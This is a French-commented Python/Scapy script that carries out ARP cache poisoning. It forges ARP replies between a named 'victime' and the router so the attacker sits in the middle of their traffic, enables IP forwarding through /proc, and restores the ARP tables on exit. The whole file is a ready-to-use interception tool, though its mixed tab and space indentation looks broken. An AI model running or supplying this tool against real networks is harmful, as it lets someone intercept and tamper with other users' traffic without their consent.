#!/usr/bin/python

from scapy.all import *
import sys
import os
import time
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--STARTSTOP', help="start/stop the mitm")
parser.add_argument('-I', '--INTERFACE', help="renseigner l'interface utilisee : eth0, wlan0, ...")
parser.add_argument('-v', '--IP_VICTIME', help="renseigner l'adresse ip de la victime")
parser.add_argument('-r', '--IP_ROUTEUR', help="renseigner l'ip du routeur")
args = parser.parse_args()


startstop = args.STARTSTOP
interface = args.INTERFACE
ip_victime = args.IP_VICTIME
ip_routeur = args.IP_ROUTEUR


# recuperation des adresses mac de la victime et du routeur
def recup_adr_mac(IP, interface):
	conf.verb = 0
	reponse, non_reponse = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in reponse:
		return rcv.sprintf(r"%Ether.src%")

# retablissement de la table arp de la victime pour ne pas couper son trafic une fois 
# que l'on a coupe notre script.
def retablissement_arp_table_victime(ip_victime, ip_routeur, interface):
	print("\n[*] Retablissement de la table ARP de la victime en cours ...")
	mac_victime = recup_adr_mac(ip_victime, interface)
	mac_routeur = recup_adr_mac(ip_routeur, interface)
	send(ARP(op = 2, pdst = ip_routeur, psrc = ip_victime, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = mac_victime), count = 7)
	send(ARP(op = 2, pdst = ip_victime, psrc = ip_routeur, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = mac_routeur), count = 7)
	fermeture()
	sys.exit(1)

# envoi des paquets arp au routeur et a la victime : le coeur du script
def envoi_arp(ip_victime, mac_victime, ip_routeur, mac_routeur):
	forge_arp_victime = ARP()
	forge_arp_victime.op = 2
	forge_arp_victime.pdst = ip_victime
	forge_arp_victime.psrc = ip_routeur
	forge_arp_victime.hwdst = mac_victime

	forge_arp_routeur = ARP()
	forge_arp_routeur.op = 2
	forge_arp_routeur.pdst = ip_routeur
	forge_arp_routeur.psrc = ip_victime
	forge_arp_routeur.hwdst = mac_routeur

	send(forge_arp_victime)
	send(forge_arp_routeur)

# retablit l'ip forwarding a sa valeur par defaut
def fermeture():
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print("[!] Fermeture ...")

def main():

    if(startstop == "start"):
	    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    elif(startstop == "stop"):
	    retablissement_arp_table_victime(ip_victime, ip_routeur, interface)
	    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.exit(1)

	try:
		mac_victime = recup_adr_mac(ip_victime, interface)
		print("[+] Recuperation de l'adresse MAC de %s : OK => %s"%(ip_victime, mac_victime))
	except Exception as e:
		print("[-] Recuperation de l'adresse MAC de %s : KO"%ip_victime)
		fermeture()
		sys.exit(1)

	try:
		mac_routeur = recup_adr_mac(ip_routeur, interface)
		print("[+] Recuperation de l'adresse MAC de %s : OK => %s"%(ip_routeur, mac_routeur))
	except Exception as e:
		print("[-] Recuperation de l'adresse MAC de %s : KO"%ip_routeur)
		fermeture()
		sys.exit(1)

	print("[*] ARP poisoning in action ... (check wireshark)")
	# c'est ici que tout se passe :)
	while 1:
		try:
			envoi_arp(ip_victime, mac_victime, ip_routeur, mac_routeur)
			time.sleep(1.5)
		except KeyboardInterrupt as e:
			retablissement_arp_table_victime(ip_victime, ip_routeur, interface)
			break

if __name__ == "__main__":
	main()
